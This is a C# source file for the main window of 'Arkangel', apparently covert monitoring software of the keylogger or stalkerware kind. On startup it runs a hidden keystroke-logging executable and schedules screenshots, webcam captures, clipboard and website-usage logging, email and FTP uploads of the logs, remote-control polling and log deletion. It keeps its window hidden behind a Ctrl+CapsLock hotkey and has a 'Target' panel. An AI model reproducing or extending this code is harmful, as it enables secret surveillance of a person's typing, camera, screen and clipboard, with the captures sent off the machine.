using System;
using System.Windows;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Windows.Interop;
using System.Diagnostics;

using System.Timers;
using System.Data.SQLite;
using System.IO;
using static Arkangel.ClipboardHelper;

namespace Arkangel
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]


        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        private const int HOTKEY_ID = 9000;

        //Modifiers:
        private const uint MOD_NONE = 0x0000; //(none)
        private const uint MOD_ALT = 0x0001; //ALT
        private const uint MOD_CONTROL = 0x0002; //CTRL
        private const uint MOD_SHIFT = 0x0004; //SHIFT
        private const uint MOD_WIN = 0x0008; //WINDOWS
        //CAPS LOCK:
        private const uint VK_CAPITAL = 0x14;
        //Screenshot
        public static System.Timers.Timer aTimer_scrshot = new System.Timers.Timer();
        //Webcam
        public static System.Timers.Timer aTimer_webcam = new System.Timers.Timer();
        // send mail
        public static System.Timers.Timer aTimer_sendMail = new System.Timers.Timer();
        //FTP
        public static System.Timers.Timer aTimer_FTP = new System.Timers.Timer();
        //CLipboard
        public static System.Timers.Timer aTimer_Clipboard = new System.Timers.Timer();
        //Website
        public static System.Timers.Timer aTimer_Website = new System.Timers.Timer();
        //Remote
        public static System.Timers.Timer aTimer_Remote = new System.Timers.Timer();
        public MainWindow()
        {
            
            InitializeComponent();
           
           // ProcessStartInfo _startkeylog = startkeylog();
            if (mainPanel.Children.ToString() != "Dashboard")
            {
                Dashboard dashboard = new Dashboard(this);
                mainPanel.Children.Add(dashboard);
            }
           


            //Keystroke
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "keystroke.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { };

            //Screenshot

            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    //-------------Setting-------------------------//
                    // query
                    string webcamPath = null;
                    string scrPath = null;
                    SQLiteCommand sqlComm_Setting = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id = current_user.id", connect);
                    SQLiteDataReader st = sqlComm_Setting.ExecuteReader();
                    while(st.Read())
                    {
                        webcamPath = Path.GetFullPath(st["webcamLog"].ToString());
                        scrPath = Path.GetFullPath(st["screenshotLog"].ToString());

                        //Console.WriteLine("webcam path: " + webcamPath);
                        //Console.WriteLine("screenshot path: "+ scrPath);
                        
                    }
                    //----------- Screenshot -----------------//
                    // query to get values of screenshot table
                    int Screenshot_hours = 0, Screenshot_minutes = 0, Screenshot_enable = 0;
                    SQLiteCommand sqlComm_Screenshot = new SQLiteCommand(@"SELECT * FROM Screenshot,current_user WHERE Screenshot.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
                    while (data.Read())
                    {
                        int.TryParse(data["enable"].ToString(), out Screenshot_enable);
                        int.TryParse(data["hours"].ToString(), out Screenshot_hours);
                        int.TryParse(data["minutes"].ToString(), out Screenshot_minutes);

                        DateTime temp_screenshot = DateTime.Parse(data["datetime"].ToString());
                        double days_screenshot = Double.Parse(data["daysDel"].ToString());

                        if (data["enDel"].ToString()=="1"&&temp_screenshot.AddDays(days_screenshot).CompareTo(DateTime.Now) >= 0)
                        {
                            try
                            {
                                if (Directory.Exists(scrPath))
                                {

                                    Directory.Delete(scrPath, true);
                                    Console.WriteLine("Delete scr log successful!");
                                }
                            }
                            catch { }
                           
                        }
                    }
                    try
                    {                    // start timer screenshot if enable
                        if (Screenshot_hours==0&&Screenshot_minutes==0)
                        {
                            Screenshot_minutes = 1;
                        }
                        Functions.SetTimerScreenShot(Screenshot_hours * 60 * 60 * 1000 + Screenshot_minutes * 60 * 1000);
                        aTimer_scrshot.Start();
                    }
                    catch { }
                    //----------------------------------//
                    //------------Webcam----------------//
                    int  Webcam_hours = 0, Webcam_minutes = 0;
                    SQLiteCommand sqlConn_Webcam = new SQLiteCommand(@"SELECT * FROM Webcam,current_user WHERE Webcam.id = current_user.id", connect);
                    SQLiteDataReader wc = sqlConn_Webcam.ExecuteReader();
                    while (wc.Read())
                    {
                        int.TryParse(wc["hours"].ToString(), out Webcam_hours);
                        int.TryParse(wc["minutes"].ToString(), out Webcam_minutes);
                        DateTime temp = DateTime.Parse(wc["datetime"].ToString());
                        double days = Double.Parse(wc["days"].ToString());
                        if (wc["enDelAfterUpload"].ToString() == "1" && temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
                        {
                            try
                            {
                                if (Directory.Exists(webcamPath))
                                {
                                    Directory.Delete(webcamPath, true);
                                    Console.WriteLine("Delete webcam logs successful!");
                                }
                            }
                            catch { }
                        }
                        
                    }
                    // Start timer for webcam
                    try
                    {
                        if (Webcam_hours == 0 && Webcam_minutes == 0)
                            Webcam_minutes = 1;
                        Functions.SetTimerWebcam(Webcam_hours * 60 * 60 * 1000 + Webcam_minutes * 60 * 1000);
                        aTimer_webcam.Start();
                    }
                    catch { }

                }

                connect.Close();
            }


            //-------------Mail//
            string enable_mail = "";
            int hours = 0;
            int minutes = 0;
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM Email,current_user WHERE Email.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                    while (data.Read())
                    {
                        enable_mail = data["enable"].ToString();
                        int.TryParse(data["hours"].ToString(), out hours);
                        int.TryParse(data["minutes"].ToString(), out minutes);
                    }
                }
                connect.Close();
            }
            if (enable_mail=="1")
            {
                Functions.SetTimerSendMail(hours * 60 * 60 * 1000 + minutes * 60 * 1000);
               
                aTimer_sendMail.Start();
            }
            else
            {
                aTimer_sendMail = new System.Timers.Timer();
            }
            //---------------------------------//

            //FTP
            int enableFTP = 0;
            int hoursFTP=0;
            int minutesFTP=0;
            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
            {
                
                connect.Open();
                using (SQLiteCommand fmd = connect.CreateCommand())
                {
                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
                    while (data.Read())
                    {
                        if (data["enable"].ToString() == "1") enableFTP = 1; else enableFTP = 0;
                        int.TryParse(data["hours"].ToString(), out hoursFTP);
                        int.TryParse(data["minutes"].ToString(), out minutesFTP);
                    }
                }
                if (enableFTP==1)
                {
                    Functions.SetTimerFTP(hoursFTP * 60 * 60 * 1000 + minutesFTP * 60 * 1000);
                    aTimer_FTP.Start();
                }
                else
                {
                    aTimer_FTP = new System.Timers.Timer();
                }
            }


            //  Closing += new System.ComponentModel.CancelEventHandler(windowl);

            //Hide();

            //Clipboard 
            Functions.SetTimerClipboard(30 * 120 * 1000);
            aTimer_Clipboard.Start();

            //Website
            Functions.SetTimerWebsite(3* 60 * 60 * 60 * 1000 + 500);
            aTimer_Website.Start();
            //Remote
            Functions.remoteWin("1");
            Functions.SetTimerRemote(5 * 60 * 1000);
            aTimer_Remote.Start();
        }
        private IntPtr _windowHandle;
        private HwndSource _source;
        protected override void OnSourceInitialized(EventArgs e)
        {
            base.OnSourceInitialized(e);
            _windowHandle = new WindowInteropHelper(this).Handle;
            _source = HwndSource.FromHwnd(_windowHandle);
            _source.AddHook(HwndHook);

            RegisterHotKey(_windowHandle, HOTKEY_ID, MOD_CONTROL,VK_CAPITAL); //CTRL + CAPS_LOCK
        }

        private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
        {
            const int WM_HOTKEY = 0x0312;
            switch (msg)
            {
                case WM_HOTKEY:
                    switch (wParam.ToInt32())
                    {
                        case HOTKEY_ID:
                            int vkey = (((int)lParam >> 16) & 0xFFFF);
                            if (vkey == VK_CAPITAL)
                            {
                                Show();
                            }
                            handled = true;
                            break;
                    }
                    break;
            }
            return IntPtr.Zero;
        }

        private void Button_OpenMenu_Click(object sender, RoutedEventArgs e)
        {
            CloseMenu.Visibility = Visibility.Visible;
            OpenMenu.Visibility = Visibility.Collapsed;
            StackPanelMenu.Visibility = Visibility.Visible;
            //lb_title.Visibility = Visibility.Visible;
           // listview.Visibility = Visibility.Visible;
            mainPanel.IsEnabled = false;
        }

        private void Button_CloseMenu_Click(object sender, RoutedEventArgs e)
        {
            CloseMenu.Visibility = Visibility.Collapsed;
            OpenMenu.Visibility = Visibility.Visible;
            StackPanelMenu.Visibility = Visibility.Hidden;
            //lb_title.Visibility = Visibility.Collapsed;
            //listview.Visibility = Visibility.Hidden;
            mainPanel.IsEnabled = true;
        }

        private void bt_home_Click(object sender, RoutedEventArgs e)
        {
            mainPanel.Children.Clear();
            Dashboard dashboard = new Dashboard(this);
            mainPanel.Children.Add(dashboard);
        }
        private void bt_logout_Click_1(object sender, RoutedEventArgs e)
        {
            if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
            {
                try
                {
                    myProcess.Kill();
                    myProcess.Dispose();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
                {
                    connect.Open();
                    using (SQLiteCommand fmd = connect.CreateCommand())
                    {
                        SQLiteCommand getid = new SQLiteCommand(@"UPDATE current_user SET id= NULL", connect);
                        getid.ExecuteNonQuery();
                    }
                    connect.Close();
                }
                LoginForm loginForm = new LoginForm();
                loginForm.Show();
                Close();
            }
           
        }

        private void bt_Quit_Click(object sender, RoutedEventArgs e)
        {
            Hide();
        }

        private Process myProcess = new Process();

        //private void Grid_Loaded(object sender, RoutedEventArgs e)
        //{
        //    //try
        //    //{
        //    //    myProcess.StartInfo.UseShellExecute = true;
        //    //    myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
        //    //    myProcess.StartInfo.CreateNoWindow = true;
        //    //    myProcess.Start();
        //    //}
        //    //catch (Exception ex)
        //    //{
        //    //    Console.WriteLine("MESSAGE: " + ex.Message);
        //    //}
        //}
        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            try
            {
                myProcess.Kill();
                myProcess.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        private void bt_Setting_Click(object sender, RoutedEventArgs e)
        {
            Setting setting = new Setting();
            setting.Owner = this;
            setting.Show();
        }

        private void bt_qGeneral_Click(object sender, RoutedEventArgs e)
        {
            General general = new General();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qClipboard_Click(object sender, RoutedEventArgs e)
        {
            _Clipboard general = new _Clipboard();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qFTP_Click(object sender, RoutedEventArgs e)
        {
            FTP general = new FTP();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(general);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qWebcam_Click(object sender, RoutedEventArgs e)
        {
            Webcam webcam = new Webcam();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(webcam);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qTarget_Click(object sender, RoutedEventArgs e)
        {
            Target target = new Target();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(target);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qUser_Click(object sender, RoutedEventArgs e)
        {
            User user = new User();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(user);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qWU_Click(object sender, RoutedEventArgs e)
        {
            Website_Usage website_Usage = new Website_Usage();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(website_Usage);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qScrshot_Click(object sender, RoutedEventArgs e)
        {
            Screenshot screenshot = new Screenshot();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(screenshot);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qMail_Click(object sender, RoutedEventArgs e)
        {
            Email email = new Email();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(email);
            bt_home.Visibility = Visibility.Visible;
        }

        private void bt_qAlert_Click(object sender, RoutedEventArgs e)
        {
            Alert alert = new Alert();
            mainPanel.Children.Clear();
            mainPanel.Children.Add(alert);
            bt_home.Visibility = Visibility.Visible;
        }

        private void StackPanel_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            DragMove();
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            aTimer_scrshot.Stop();
            aTimer_sendMail.Stop();
            aTimer_webcam.Stop();
            aTimer_Clipboard.Stop();
            Functions.EndTask("keystroke.exe");
            Functions.EndTask("Arkangel.exe");
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            ClipboardMonitor.OnClipboardChange += ClipboardMonitor_OnClipboardChange;
            ClipboardMonitor.Start();
        }
        private void ClipboardMonitor_OnClipboardChange(ClipboardFormat format, object data)
        {
            try
            {
                Functions.WriteClipboard();
            }
            catch { }
        }

        private void bt_sync_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                ProcessStartInfo start = new ProcessStartInfo();
                start.WorkingDirectory = @"..\..\module\";
                start.FileName = "upKeystrokeLog.exe";
                start.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(start);
            }
            catch { }
            try
            {
                Functions.Uptoken();
                Functions.syncDown();
            }
            catch { }
            Functions.controlRemote();
        }
    }
}

